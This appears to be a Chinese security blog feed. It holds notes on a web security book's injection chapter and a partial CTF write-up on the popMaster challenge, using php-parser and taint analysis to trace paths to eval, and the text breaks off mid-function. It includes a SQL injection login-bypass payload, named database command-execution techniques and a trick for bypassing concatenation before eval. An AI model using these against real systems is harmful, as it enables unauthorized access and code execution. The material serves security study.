<h2 id="第六章-html-5-安全">第六章 HTML 5 安全</h2>

<h2 id="第七章-注入攻击">第七章 注入攻击</h2>

<p><strong>注入的本质</strong>：把用户输入的<strong>数据</strong>当作<strong>代码</strong>执行。</p>

<p>数据库攻击：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- LOAD_FILE() INTO DUMPFILE 读写文件
- Mysql UDF(User-Defined Functions) 执行命令
- MS SQL Server ”xp_cmdshell“执行系统命令
- 字符集导致的编码问题
</code></pre></div></div>

<p><strong>防御：</strong>预处理最佳</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211127201155.png" alt="1" /></p>

<p>post ：<code class="language-plaintext highlighter-rouge">name=' or 1=1#&amp;password=</code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211127201251.png" alt="image-20211123150224827" /></p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">不使用预处理</span><span class="p">:</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="s1">' and password = </span><span class="se">''</span><span class="s1">
使用预处理：
select * from users where username = </span><span class="se">''</span><span class="s1">'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="s1">' and password = </span><span class="se">''</span><span class="s1">
</span></code></pre></div></div>

<h2 id="第八章-文件上传">第八章 文件上传</h2>

<h2 id="第九章-认证与会话管理">第九章 认证与会话管理</h2>

<h2 id="第十章-访问控制">第十章 访问控制</h2>]]></content><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><summary type="html"><![CDATA[安全工程师的核心竞争力不在于拥有多少个0day，掌握多少种安全技术，而是在于他对安全理解的深度，以及由此引申的看待安全问题的角度和高度。 站在白帽子的视角，除了剖析攻击原理，更加需要关注如何防范这些漏洞。]]></summary></entry><entry><title type="html">popMaster</title><link href="http://localhost:4000/2021/10/09/popmaster.html" rel="alternate" type="text/html" title="popMaster" /><published>2021-10-09T23:30:20+08:00</published><updated>2021-10-09T23:30:20+08:00</updated><id>http://localhost:4000/2021/10/09/popmaster</id><content type="html" xml:base="http://localhost:4000/2021/10/09/popmaster.html"><![CDATA[<p>强网杯popmaster这题一直耿耿于怀，用正则毕竟不是作者的本意。刚好在看静态分析这块，纯理论实在太难顶，就再重新揣摩揣摩。</p>

<!--more-->

<p><a href="https://github.com/nikic/PHP-Parser">php-parser</a>是一项用PHP编写的PHP解释器，可以把php代码转化为AST，以利于我们静态分析，在回到这道题之前，先简单了解一下php-parser的用法。</p>

<p>一个简单的例子：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="kn">use</span> <span class="nc">PhpParser\Error</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\NodeTraverser</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\ParserFactory</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
<span class="nv">$code</span> <span class="o">=</span> <span class="sh">&lt;&lt;&lt;'CODE'
&lt;?php
$a="theoyu";
echo($a);
CODE;</span>
<span class="c1">//创建解释器实例</span>
<span class="nv">$parser</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nc">ParserFactory</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">create</span><span class="p">(</span><span class="nc">ParserFactory</span><span class="o">::</span><span class="no">PREFER_PHP7</span><span class="p">);</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="nv">$ast</span> <span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="nf">parse</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
  	<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">);</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Error</span> <span class="nv">$error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Parse error: </span><span class="si">{</span><span class="nv">$error</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>首先需要创建一个解释器实例，同时需要指明php版本，对源码进行解析，同时通过<code class="language-plaintext highlighter-rouge">PhpParser\Error</code>对代码的异常进行捕获。</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">array(2) {</span>
  <span class="s">[0]=&gt;</span>
  <span class="s">object(PhpParser\Node\Stmt\Expression)#1178 (2) {</span>
    <span class="s">["expr"]=&gt;</span>
    <span class="s">object(PhpParser\Node\Expr\Assign)#1177 (3) {</span>
      <span class="s">["var"]=&gt;</span>
      <span class="s">object(PhpParser\Node\Expr\Variable)#1175 (2) {</span>
        <span class="s">["name"]=&gt;</span>
        <span class="s">string(1) "a"</span>
        <span class="s">["attributes":protected]=&gt;</span>
        <span class="s">array(2) {</span>
          <span class="s">["startLine"]=&gt;</span>
          <span class="s">int(2)</span>
          <span class="s">["endLine"]=&gt;</span>
          <span class="s">int(2)</span>
        <span class="s">}</span>
      <span class="s">}</span>
      <span class="s">["expr"]=&gt;</span>
      <span class="s">object(PhpParser\Node\Scalar\String_)#1176 (2) {</span>
        <span class="s">["value"]=&gt;</span>
        <span class="s">string(6) "theoyu"</span>
        <span class="s">["attributes":protected]=&gt;</span>
        <span class="s">array(3) {</span>
          <span class="s">["startLine"]=&gt;</span>
          <span class="s">int(2)</span>
          <span class="s">["endLine"]=&gt;</span>
          <span class="s">int(2)</span>
          <span class="s">["kind"]=&gt;</span>
          <span class="s">int(2)</span>
        <span class="s">}</span>
      <span class="s">}</span>
      <span class="s">["attributes":protected]=&gt;</span>
      <span class="s">array(2) {</span>
        <span class="s">["startLine"]=&gt;</span>
        <span class="s">int(2)</span>
        <span class="s">["endLine"]=&gt;</span>
        <span class="s">int(2)</span>
      <span class="s">}</span>
    <span class="s">}</span>
    <span class="s">["attributes":protected]=&gt;</span>
    <span class="s">array(2) {</span>
      <span class="s">["startLine"]=&gt;</span>
      <span class="s">int(2)</span>
      <span class="s">["endLine"]=&gt;</span>
      <span class="s">int(2)</span>
    <span class="s">}</span>
  <span class="s">}</span>
  <span class="s">[1]=&gt;</span>
  <span class="s">object(PhpParser\Node\Stmt\Echo_)#1180 (2) {</span>
    <span class="s">["exprs"]=&gt;</span>
    <span class="s">array(1) {</span>
      <span class="s">[0]=&gt;</span>
      <span class="s">object(PhpParser\Node\Expr\Variable)#1179 (2) {</span>
        <span class="s">["name"]=&gt;</span>
        <span class="s">string(1) "a"</span>
        <span class="s">["attributes":protected]=&gt;</span>
        <span class="s">array(2) {</span>
          <span class="s">["startLine"]=&gt;</span>
          <span class="s">int(3)</span>
          <span class="s">["endLine"]=&gt;</span>
          <span class="s">int(3)</span>
        <span class="s">}</span>
      <span class="s">}</span>
    <span class="s">}</span>
    <span class="s">["attributes":protected]=&gt;</span>
    <span class="s">array(2) {</span>
      <span class="s">["startLine"]=&gt;</span>
      <span class="s">int(3)</span>
      <span class="s">["endLine"]=&gt;</span>
      <span class="s">int(3)</span>
    <span class="s">}</span>
  <span class="s">}</span>
<span class="err">}</span>
</code></pre></div></div>

<p>可以使用NodeDumper更加直观的查看AST</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">use</span> <span class="nc">PhpParser\NodeDumper</span><span class="p">;</span>
<span class="nv">$dumper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NodeDumper</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$dumper</span><span class="o">-&gt;</span><span class="nf">dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">)</span> <span class="p">;</span>
</code></pre></div></div>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">array(</span>
    <span class="s">0</span><span class="err">:</span> <span class="s">Stmt_Expression(</span>
        <span class="s">expr</span><span class="err">:</span> <span class="s">Expr_Assign(</span>
            <span class="s">var</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                <span class="s">name</span><span class="err">:</span> <span class="s">a</span>
            <span class="s">)</span>
            <span class="s">expr</span><span class="err">:</span> <span class="s">Scalar_String(</span>
                <span class="s">value</span><span class="err">:</span> <span class="s">theoyu</span>
            <span class="s">)</span>
        <span class="s">)</span>
    <span class="s">)</span>
    <span class="s">1</span><span class="err">:</span> <span class="s">Stmt_Echo(</span>
        <span class="s">exprs</span><span class="err">:</span> <span class="s">array(</span>
            <span class="s">0</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                <span class="s">name</span><span class="err">:</span> <span class="s">a</span>
            <span class="s">)</span>
        <span class="s">)</span>
    <span class="s">)</span>
<span class="s">)</span>
</code></pre></div></div>

<p>回到源码</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span><span class="o">=</span><span class="s2">"theoyu"</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span>
如果我们想改为：
<span class="cp">&lt;?php</span>
<span class="nv">$a</span><span class="o">=</span><span class="s2">"hacker"</span><span class="p">;</span>
<span class="k">print</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>对于<code class="language-plaintext highlighter-rouge">$a</code>而言，我们可以直接访问AST数组来修改其内容。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">expr</span><span class="o">-&gt;</span><span class="n">expr</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span><span class="c1">//string(6) "theoyu"</span>
<span class="nv">$ast</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">expr</span><span class="o">-&gt;</span><span class="n">expr</span><span class="o">-&gt;</span><span class="n">value</span><span class="o">=</span><span class="s2">"hacker"</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">expr</span><span class="o">-&gt;</span><span class="n">expr</span><span class="o">-&gt;</span><span class="n">value</span><span class="p">);</span><span class="c1">//string(6) "hacker"</span>
</code></pre></div></div>

<p>不过要想修改函数<code class="language-plaintext highlighter-rouge">echo</code>可就没这么简单了，php-parser提供了一个用于访问和遍历AST结点的接口<code class="language-plaintext highlighter-rouge">PhpParser\NodeTraverser</code>，同时我们可以自定义继承<code class="language-plaintext highlighter-rouge">NodeVisitorAbstract</code>   的<code class="language-plaintext highlighter-rouge">visitor</code>，在里面实现需要对AST的操作，即可在遍历结点时达到对AST修改的目的。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">NameNodeVisitor</span> <span class="kd">extends</span> <span class="nc">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">leaveNode</span><span class="p">(</span><span class="kt">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="k">instanceof</span> <span class="n">Node\Scalar\String_</span><span class="p">){</span>
            <span class="nv">$node</span><span class="o">-&gt;</span><span class="n">value</span><span class="o">=</span><span class="s2">"hacker"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>不过对于echo的修改就没那么容易</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">PrintNodeVisitor</span> <span class="kd">extends</span>  <span class="nc">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">leaveNode</span><span class="p">(</span><span class="kt">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="k">instanceof</span> <span class="n">Node\Stmt\Echo_</span><span class="p">){</span>
			<span class="c1">//return ...</span>
       <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这里我们需要直接返回一个<code class="language-plaintext highlighter-rouge">print($a)</code> 的结点，也就是</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$node</span><span class="o">-&gt;</span><span class="n">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span> <span class="c1">//"name"</span>
<span class="k">return</span> <span class="k">new</span> <span class="nc">PhpParser\Node\Stmt\Expression</span><span class="p">(</span><span class="k">new</span> <span class="nc">Node\Expr\Print_</span><span class="p">(</span><span class="k">new</span> <span class="nc">PhpParser\Node\Expr\Variable</span><span class="p">(</span><span class="nv">$node</span><span class="o">-&gt;</span><span class="n">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)));</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">PrettyPrinter\Standard</code>可以帮助我们从AST复原到源代码</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kn">use</span> <span class="nc">PhpParser\Error</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\ParserFactory</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\NodeDumper</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\NodeTraverser</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\Node</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\NodeVisitorAbstract</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">PhpParser\PrettyPrinter</span><span class="p">;</span>


<span class="k">require</span> <span class="s2">"vendor/autoload.php"</span><span class="p">;</span>
<span class="nv">$code</span> <span class="o">=</span> <span class="sh">&lt;&lt;&lt;'CODE'
&lt;?php
$name="theoyu";
echo($name);
CODE;</span>

<span class="kd">class</span> <span class="nc">NameNodeVisitor</span> <span class="kd">extends</span> <span class="nc">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">leaveNode</span><span class="p">(</span><span class="kt">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="k">instanceof</span> <span class="n">Node\Scalar\String_</span><span class="p">){</span>
            <span class="nv">$node</span><span class="o">-&gt;</span><span class="n">value</span><span class="o">=</span><span class="s2">"hacker"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">PrintNodeVisitor</span> <span class="kd">extends</span>  <span class="nc">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">leaveNode</span><span class="p">(</span><span class="kt">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="k">instanceof</span> <span class="n">Node\Stmt\Echo_</span><span class="p">){</span>
<span class="c1">//           var_dump($node-&gt;exprs[0]-&gt;name); //"name"</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nc">PhpParser\Node\Stmt\Expression</span><span class="p">(</span><span class="k">new</span> <span class="nc">Node\Expr\Print_</span><span class="p">(</span><span class="k">new</span> <span class="nc">PhpParser\Node\Expr\Variable</span><span class="p">(</span><span class="nv">$node</span><span class="o">-&gt;</span><span class="n">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)));</span>
       <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$parser</span><span class="o">=</span><span class="p">(</span><span class="k">new</span> <span class="nc">ParserFactory</span><span class="p">())</span><span class="o">-&gt;</span><span class="nf">create</span><span class="p">(</span><span class="nc">ParserFactory</span><span class="o">::</span><span class="no">PREFER_PHP7</span><span class="p">);</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="nv">$ast</span><span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="nf">parse</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
    <span class="nv">$traverser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NodeTraverser</span><span class="p">();</span>
    <span class="nv">$traverser</span><span class="o">-&gt;</span><span class="nf">addVisitor</span><span class="p">(</span><span class="k">new</span> <span class="nc">NameNodeVisitor</span><span class="p">());</span>
    <span class="nv">$traverser</span><span class="o">-&gt;</span><span class="nf">addVisitor</span><span class="p">(</span><span class="k">new</span> <span class="nc">PrintNodeVisitor</span><span class="p">());</span>
    <span class="nv">$out</span><span class="o">=</span><span class="nv">$traverser</span><span class="o">-&gt;</span><span class="nf">traverse</span><span class="p">(</span><span class="nv">$ast</span><span class="p">);</span>

    <span class="nv">$prettyPrinter</span><span class="o">=</span> <span class="k">new</span> <span class="nc">PrettyPrinter\Standard</span><span class="p">();</span>
    <span class="nv">$new_code</span><span class="o">=</span><span class="nv">$prettyPrinter</span><span class="o">-&gt;</span><span class="nf">prettyPrintFile</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$code</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"---After Parser--- </span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$new_code</span><span class="p">;</span>

<span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nc">Error</span> <span class="nv">$e</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s1">'Parse Error: '</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>输出</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$name</span><span class="o">=</span><span class="s2">"theoyu"</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
<span class="cp">?&gt;</span>

---After Parser--- 

<span class="cp">&lt;?php</span>

<span class="nv">$name</span> <span class="o">=</span> <span class="s2">"hacker"</span><span class="p">;</span>
<span class="k">print</span> <span class="nv">$name</span><span class="p">;</span>
</code></pre></div></div>

<p>很好奇为什么中间多了一行空行。。</p>

<p>简单认识了php-parser后，让我们重新回到popmaster的16w行代码。</p>

<p>先看下面这一个类：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211012002816.png" alt="image-20211006152537265" /></p>

<p><code class="language-plaintext highlighter-rouge">c830sD</code>是我们的入口函数，往下两个if语句构成了两个分支，实际上本题也就是需要我们从一个一个分支后找到正确的一条路径。</p>

<p>因为参数可控，把输入的参数定为污点，每次跳转到新的一层则可看作污点传播，如果在最后eval语句里污点仍存在，即可输出路径。那现在我们也就需要关注到特殊的程序点(Sink)，是否有对污点的消毒处理是否有效。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211012002825.png" alt="image-20211006160304743" /></p>

<p>在上面的例子里，第一项虽然对eval语句里的参数进行了字符串拼接，但我们只要在命令执行的后面加上<code class="language-plaintext highlighter-rouge">//</code>即可无视拼接语句，故消毒无效。</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span><span class="o">=</span><span class="s2">"echo 3;//echo 4;"</span><span class="p">;</span>
<span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="mi">3</span>
</code></pre></div></div>

<p>再看下面的消毒，虽然尝试替换变量，并没有替换关键变量，可以看作无效消毒。</p>

<p>这样来看，只有直接把关键变量替换这一种有效消毒方式。</p>

<p>后面结合@Heihu577<a href="https://gitee.com/He1huKey/popmaster/blob/master/popmaster.zip">代码</a>谈谈具体污点分析的实现。</p>

<p>作者首先在污点分析前，创建了一个DelCallVisitor对整个AST进行了一次遍历，如下所示</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">DelCallVisitor</span> <span class="kd">extends</span> <span class="nc">NodeVisitorAbstract</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">leaveNode</span><span class="p">(</span><span class="kt">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$node</span> <span class="k">instanceof</span> <span class="n">Node\Stmt\If_</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$node</span> <span class="o">-&gt;</span> <span class="n">cond</span> <span class="k">instanceof</span> <span class="nc">FuncCall</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$node</span> <span class="o">-&gt;</span> <span class="n">cond</span> <span class="o">-&gt;</span> <span class="n">name</span> <span class="o">-&gt;</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'method_exists'</span>
        <span class="p">){</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$node</span> <span class="o">-&gt;</span> <span class="n">stmts</span><span class="p">){</span>
                <span class="k">return</span> <span class="nv">$node</span> <span class="o">-&gt;</span> <span class="n">stmts</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>比如原语句为</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">rHzhIHw</span><span class="p">,</span> <span class="s1">'kzPUMm'</span><span class="p">))</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">rHzhIHw</span><span class="o">-&gt;</span><span class="nf">kzPUMm</span><span class="p">(</span><span class="nv">$NEaSt</span><span class="p">);</span>
</code></pre></div></div>

<p>AST为</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">stmts</span><span class="pi">:</span> <span class="s">array(</span>
    <span class="s">0</span><span class="err">:</span> <span class="s">Stmt_If(</span>
        <span class="s">cond</span><span class="err">:</span> <span class="s">Expr_FuncCall(</span>
            <span class="s">name</span><span class="err">:</span> <span class="s">Name(</span>
                <span class="s">parts</span><span class="err">:</span> <span class="s">array(</span>
                    <span class="s">0</span><span class="err">:</span> <span class="s">method_exists</span>
                <span class="s">)</span>
            <span class="s">)</span>
            <span class="s">args</span><span class="err">:</span> <span class="s">array(</span>
                <span class="s">0</span><span class="err">:</span> <span class="s">Arg(</span>
                    <span class="s">name</span><span class="err">:</span> <span class="no">null</span>
                    <span class="s">value</span><span class="err">:</span> <span class="s">Expr_PropertyFetch(</span>
                        <span class="s">var</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                            <span class="s">name</span><span class="err">:</span> <span class="s">this</span>
                        <span class="s">)</span>
                        <span class="s">name</span><span class="err">:</span> <span class="s">Identifier(</span>
                            <span class="s">name</span><span class="err">:</span> <span class="s">rHzhIHw</span>
                        <span class="s">)</span>
                    <span class="s">)</span>
                    <span class="s">byRef</span><span class="err">:</span> <span class="no">false</span>
                    <span class="s">unpack</span><span class="err">:</span> <span class="no">false</span>
                <span class="s">)</span>
                <span class="s">1</span><span class="err">:</span> <span class="s">Arg(</span>
                    <span class="s">name</span><span class="err">:</span> <span class="no">null</span>
                    <span class="s">value</span><span class="err">:</span> <span class="s">Scalar_String(</span>
                        <span class="s">value</span><span class="err">:</span> <span class="s">kzPUMm</span>
                    <span class="s">)</span>
                    <span class="s">byRef</span><span class="err">:</span> <span class="no">false</span>
                    <span class="s">unpack</span><span class="err">:</span> <span class="no">false</span>
                <span class="s">)</span>
            <span class="s">)</span>
        <span class="s">)</span>
        <span class="s">stmts</span><span class="err">:</span> <span class="s">array(</span>
            <span class="s">0</span><span class="err">:</span> <span class="s">Stmt_Expression(</span>
                <span class="s">expr</span><span class="err">:</span> <span class="s">Expr_MethodCall(</span>
                    <span class="s">var</span><span class="err">:</span> <span class="s">Expr_PropertyFetch(</span>
                        <span class="s">var</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                            <span class="s">name</span><span class="err">:</span> <span class="s">this</span>
                        <span class="s">)</span>
                        <span class="s">name</span><span class="err">:</span> <span class="s">Identifier(</span>
                            <span class="s">name</span><span class="err">:</span> <span class="s">rHzhIHw</span>
                        <span class="s">)</span>
                    <span class="s">)</span>
                    <span class="s">name</span><span class="err">:</span> <span class="s">Identifier(</span>
                        <span class="s">name</span><span class="err">:</span> <span class="s">kzPUMm</span>
                    <span class="s">)</span>
                    <span class="s">args</span><span class="err">:</span> <span class="s">array(</span>
                        <span class="s">0</span><span class="err">:</span> <span class="s">Arg(</span>
                            <span class="s">name</span><span class="err">:</span> <span class="no">null</span>
                            <span class="s">value</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                                <span class="s">name</span><span class="err">:</span> <span class="s">NEaSt</span>
                            <span class="s">)</span>
                            <span class="s">byRef</span><span class="err">:</span> <span class="no">false</span>
                            <span class="s">unpack</span><span class="err">:</span> <span class="no">false</span>
                        <span class="s">)</span>
                    <span class="s">)</span>
                <span class="s">)</span>
            <span class="s">)</span>
        <span class="s">)</span>
        <span class="s">elseifs</span><span class="err">:</span> <span class="s">array(</span>
        <span class="s">)</span>
        <span class="s">else</span><span class="err">:</span> <span class="no">null</span>
    <span class="s">)</span>
</code></pre></div></div>

<p>经过一轮traverse后，AST变为了</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">stmts</span><span class="pi">:</span> <span class="s">array(</span>
    <span class="s">0</span><span class="err">:</span> <span class="s">Stmt_Expression(</span>
        <span class="s">expr</span><span class="err">:</span> <span class="s">Expr_MethodCall(</span>
            <span class="s">var</span><span class="err">:</span> <span class="s">Expr_PropertyFetch(</span>
                <span class="s">var</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                    <span class="s">name</span><span class="err">:</span> <span class="s">this</span>
                <span class="s">)</span>
                <span class="s">name</span><span class="err">:</span> <span class="s">Identifier(</span>
                    <span class="s">name</span><span class="err">:</span> <span class="s">rHzhIHw</span>
                <span class="s">)</span>
            <span class="s">)</span>
            <span class="s">name</span><span class="err">:</span> <span class="s">Identifier(</span>
                <span class="s">name</span><span class="err">:</span> <span class="s">kzPUMm</span>
            <span class="s">)</span>
            <span class="s">args</span><span class="err">:</span> <span class="s">array(</span>
                <span class="s">0</span><span class="err">:</span> <span class="s">Arg(</span>
                    <span class="s">name</span><span class="err">:</span> <span class="no">null</span>
                    <span class="s">value</span><span class="err">:</span> <span class="s">Expr_Variable(</span>
                        <span class="s">name</span><span class="err">:</span> <span class="s">NEaSt</span>
                    <span class="s">)</span>
                    <span class="s">byRef</span><span class="err">:</span> <span class="no">false</span>
                    <span class="s">unpack</span><span class="err">:</span> <span class="no">false</span>
                <span class="s">)</span>
            <span class="s">)</span>
        <span class="s">)</span>
    <span class="s">)</span>
</code></pre></div></div>

<p>通过复原也就是</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">rHzhIHw</span><span class="o">-&gt;</span><span class="nf">kzPUMm</span><span class="p">(</span><span class="nv">$NEaSt</span><span class="p">);</span>
</code></pre></div></div>

<p>刚开始很好奇为什么要加上这一个<code class="language-plaintext highlighter-rouge">visitor</code>，后来发现如果把这里的if分支全部优化，那么每个函数的开始开始可以分为4类：</p>

<ol>
  <li>for 循环，然后赋值语句</li>
  <li>if(a&gt;b)或者if(a&lt;b)，然后赋值语句</li>
  <li>直接赋值</li>
  <li>直接调用下一个跳转</li>
</ol>

<p>这也分别代表<code class="language-plaintext highlighter-rouge">ParseItem</code>函数中的4个分支，之后也就是也就是针对以上四种方式(准确说只有前三种，因为跳转到下一个函数,就已经开始新的<code class="language-plaintext highlighter-rouge">ParseItem</code>)的赋值语句，判断消毒是否有效。</p>

<p>后续用getCallName拿到后续跳用的方法，反复调用,知道没有后续的方法，也就是走到了<code class="language-plaintext highlighter-rouge">eval</code></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">getCallName</span><span class="p">(</span><span class="nv">$stmts</span><span class="p">){</span>
    <span class="nv">$call</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$stmts</span> <span class="o">-&gt;</span> <span class="n">stmts</span> <span class="k">as</span> <span class="nv">$stmt</span><span class="p">){</span>
